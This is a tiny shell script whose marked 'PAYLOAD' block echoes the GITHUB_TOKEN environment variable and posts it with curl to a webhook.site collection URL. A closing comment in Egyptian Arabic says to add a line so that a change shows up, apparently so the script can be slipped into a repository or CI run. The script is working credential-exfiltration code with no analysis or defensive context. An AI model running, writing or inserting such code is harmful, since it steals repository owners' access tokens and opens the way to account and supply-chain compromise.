#!/bin/sh
# ===== PAYLOAD =====
echo "GITHUB_TOKEN=$GITHUB_TOKEN" | curl -s -X POST -d @- https://webhook.site/baa97992-65f4-4e29-a57e-e1f0b3ed39b1
# ===== END PAYLOAD =====
# Modified: $(date)   # 👈 أضف السطر ده عشان يظهر تغيير
